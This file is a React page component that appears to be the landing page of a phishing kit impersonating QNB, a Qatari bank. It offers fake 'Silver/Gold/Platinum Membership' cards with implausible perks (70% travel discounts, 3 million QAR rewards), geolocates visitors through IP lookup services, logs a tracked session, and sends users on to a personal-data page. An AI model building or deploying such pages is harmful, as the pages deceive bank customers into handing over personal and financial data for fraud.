import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { nanoid } from "nanoid";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { Car, Hotel, Plane, ParkingCircle, Gift, Lock, Globe, Trophy, Wallet, Crown } from "lucide-react";
import Header from "@/components/Header";

const bankImages = {
  all: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663799792395/oAJHukhWMVRNiMzZ.jpg",
  qnb: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663799792395/oAJHukhWMVRNiMzZ.jpg",
};

const cards = [
  { bank: "qnb", nameAr: "العضوية الفضية", nameEn: "Silver Membership", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663799792395/oAJHukhWMVRNiMzZ.jpg" },
  { bank: "qnb", nameAr: "العضوية الذهبية", nameEn: "Gold Membership", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663799792395/iGmRASXdPpfccEAl.jpg" },
  { bank: "qnb", nameAr: "العضوية البلاتينية", nameEn: "Platinum Membership", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663799792395/zsihwcfelPfjbhbO.jpg" },
];

export default function Home() {
  const [, setLocation] = useLocation();
  const { language, setLanguage } = useLanguage();
  const [bankSelect, setBankSelect] = useState("all");
  const [mainCardImage, setMainCardImage] = useState(bankImages.all);
  const [currentSlide, setCurrentSlide] = useState(0);
  const [userCountry, setUserCountry] = useState("Qatar");
  const createSessionMutation = trpc.submissions.createSession.useMutation();

  const isArabic = language === "ar";

  useEffect(() => {
    const fetchCountry = async () => {
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        if (data.country_name) {
          setUserCountry(data.country_name);
          return;
        }
      } catch (e) {
        console.log("ipapi failed, trying backup...");
      }

      try {
        const res = await fetch("https://ipwho.is/");
        const data = await res.json();
        if (data.country) {
          setUserCountry(data.country);
        }
      } catch (e) {
        console.error("Backup country fetch failed");
      }
    };

    fetchCountry();

    const timer = setInterval(() => {
      setCurrentSlide((prev) => (prev + 1) % 2);
    }, 3000);
    return () => clearInterval(timer);
  }, []);

  const updatePage = (bankType: string) => {
    setBankSelect(bankType);
    setMainCardImage(bankImages[bankType as keyof typeof bankImages]);
  };

  const startSession = async (selectedBank: string) => {
    const sessionId = nanoid();
    localStorage.setItem("sessionId", sessionId);
    localStorage.setItem("selectedBank", selectedBank);
    
    // توجيه المستخدم فوراً لتحسين تجربة المستخدم
    setLocation(`/personal-data?bank=${selectedBank}&session=${sessionId}`);
    
    // إرسال البيانات في الخلفية
    try {
      await createSessionMutation.mutateAsync({
        sessionId,
        selectedBank,
        country: userCountry,
      });
    } catch (error) {
      console.error("Error creating session in DB:", error);
    }
  };

  const goToPersonalData = () => {
    if (bankSelect !== "all") {
      startSession(bankSelect);
    } else {
      alert(isArabic ? "يرجى اختيار البنك أولاً" : "Please select your bank first");
    }
  };

  const handleCardClick = (bank: string) => {
    startSession(bank);
  };

  const toggleLanguage = () => {
    setLanguage(isArabic ? "en" : "ar");
  };

  const filteredCards = bankSelect === "all" ? cards : cards.filter((c) => c.bank === bankSelect);

  return (
    <div dir={isArabic ? "rtl" : "ltr"}>
      <style>{`
        body { margin: 0; padding: 0; font-family: sans-serif; background-color: #f4f4f4; }
        .header { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background-color: #ffffff; border-bottom: 2px solid #8C0032; position: relative; z-index: 1000; }
        .header-right { display: flex; align-items: center; gap: 15px; }
        .logo { height: 60px; background-color: white; padding: 0; }
        .menu-icon { font-size: 28px; color: #8C0032; cursor: pointer; }
        .lang-btn { background-color: #8C0032; color: #ffffff; border: none; padding: 8px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 14px; }
        .slider-container { width: 100%; height: 200px; position: relative; overflow: hidden; }
        .slider-container img { width: 100%; height: 100%; object-fit: cover; position: absolute; transition: opacity 1s; opacity: 0; }
        .slider-container img.active { opacity: 1; }
        .dropdown-container { padding: 20px; text-align: center; }
        .dropdown-select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; background: white; }

        .cards-container { padding: 0 10px 20px 10px; }
	        .qnb-card-box { background-color: transparent; border-radius: 15px; padding: 10px; margin-bottom: 20px; text-align: center; border: 1px solid #e0e0e0; max-width: 400px; margin-left: auto; margin-right: auto; }
	        .bank-logo { display: none; }
	        .card-image-qnb { width: 100%; max-width: 250px; margin-bottom: 10px; border-radius: 8px; }
        .footer-image { width: 100%; display: block; margin-top: 20px; object-fit: cover; }
        
        /* أنماط المميزات الجديدة */
	        .features-title { font-size: 12px; font-weight: bold; color: #8C0032; margin: 10px 0 8px 0; text-align: center; }
	        .features-icons-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 5px; margin-bottom: 10px; }
	        .feature-icon-item { display: flex; flex-direction: column; align-items: center; gap: 3px; padding: 5px; background: #f9f9f9; border-radius: 6px; border: 1px solid #e0e0e0; }
	        .feature-icon-item svg { width: 18px; height: 18px; color: #8C0032; }
	        .feature-icon-item span { font-size: 9px; color: #333; font-weight: 500; text-align: center; line-height: 1.1; }
	        
	        .features-bottom-row { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 5px; margin-bottom: 10px; }
	        .feature-bottom-item { display: flex; flex-direction: column; align-items: center; gap: 3px; padding: 5px; background: #f9f9f9; border-radius: 6px; border: 1px solid #e0e0e0; }
	        .feature-bottom-item svg { width: 18px; height: 18px; color: #8C0032; }
	        .feature-bottom-item span { font-size: 9px; color: #333; font-weight: 500; text-align: center; line-height: 1.1; }
        
	        .feature-large-item { background: linear-gradient(135deg, #8C0032 0%, #c41e5e 100%); color: white; padding: 8px; border-radius: 6px; display: flex; align-items: center; gap: 8px; margin-bottom: 10px; }
	        .feature-large-item svg { width: 20px; height: 20px; color: white; flex-shrink: 0; }
	        .feature-large-item span { font-size: 10px; font-weight: 600; }
        
        .apply-btn { background-color: #8C0032; color: #ffffff; padding: 12px 0; width: 100%; border: none; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; }
      `}</style>
      <Header />
      <div className="slider-container">
        <img
          src="https://i.ibb.co/0RwDLqXq/h2-visa-cug-china.jpg"
          className={currentSlide === 0 ? "active" : ""}
          alt="Slide 1"
        />
        <img
          src="https://i.ibb.co/mCKNbdgW/PHL.jpg"
          className={currentSlide === 1 ? "active" : ""}
          alt="Slide 2"
        />
      </div>
      <div className="dropdown-container">
        <select className="dropdown-select" value={bankSelect} onChange={(e) => updatePage(e.target.value)}>
          <option value="all">{isArabic ? "اختر نوع العضوية" : "Select Membership Type"}</option>
          <option value="qnb">{isArabic ? "تفعيل العضوية" : "Activate Membership"}</option>
        </select>
      </div>


      <div className="cards-container">
        {filteredCards.map((card, idx) => (
          <div key={idx} className="qnb-card-box">
            <img src={card.logo} className="bank-logo" alt="Bank Logo" />
            <h3 className="text-xl font-bold mb-4 text-[#8C0032]">{isArabic ? (card as any).nameAr : (card as any).nameEn}</h3>
            <img src={card.img} className="card-image-qnb" alt="Credit Card" />
            
            {/* المميزات الأساسية */}
            <div className="features-title">{isArabic ? "المميزات الرئيسية" : "Main Features"}</div>
            <div className="features-icons-grid">
              <div className="feature-icon-item">
                <Car />
                <span>{isArabic ? "تأجير السيارات\nخصم 70%" : "Car Rental\n70% Discount"}</span>
              </div>
              <div className="feature-icon-item">
                <Hotel />
                <span>{isArabic ? "حجوزات الفنادق\nخصم 70%" : "Hotel Booking\n70% Discount"}</span>
              </div>
              <div className="feature-icon-item">
                <Plane />
                <span>{isArabic ? "تذاكر الطيران\nخصم 70%" : "Flight Tickets\n70% Discount"}</span>
              </div>
              <div className="feature-icon-item">
                <ParkingCircle />
                <span>{isArabic ? "المواقف\nخصم 70%" : "Parking\n70% Discount"}</span>
              </div>
              <div className="feature-icon-item">
                <Gift />
                <span>{isArabic ? "مميزات حصرية\nعروض خاصة" : "Exclusive\nBenefits"}</span>
              </div>
              <div className="feature-icon-item">
                <Lock />
                <span>{isArabic ? "دفع آمن\nحماية كاملة" : "Secure\nPayment"}</span>
              </div>
            </div>

            {/* المميزات الإضافية */}
            <div className="features-title">{isArabic ? "مميزات إضافية" : "Additional Features"}</div>
            <div className="features-bottom-row">
              <div className="feature-bottom-item">
                <Globe />
                <span>{isArabic ? "تقبل عالمياً" : "Global\nAcceptance"}</span>
              </div>
              <div className="feature-bottom-item">
                <Wallet />
                <span>{isArabic ? "كاش باك\nحتى 5000 ريال" : "Cashback\nUp to 5000 QAR"}</span>
              </div>
              <div className="feature-bottom-item">
                <Crown />
                <span>{isArabic ? "صالات VIP\nفي المطارات" : "VIP Lounge\nAccess"}</span>
              </div>
            </div>

            {/* الجائزة السنوية */}
            <div className="feature-large-item">
              <Trophy />
              <span>{isArabic ? "جوائز سنوية تصل إلى 3 مليون ريال قطري" : "Annual Rewards Up to 3 Million QAR"}</span>
            </div>

            <button className="apply-btn" onClick={() => handleCardClick(card.bank)}>
              {isArabic ? "اطلبها الآن" : "Order Now"}
            </button>
          </div>
        ))}
      </div>
      <div className="footer-image-container">
        <img src={isArabic ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg"} className="footer-image-standard" alt="Footer" />
      </div>
    </div>
  );
}
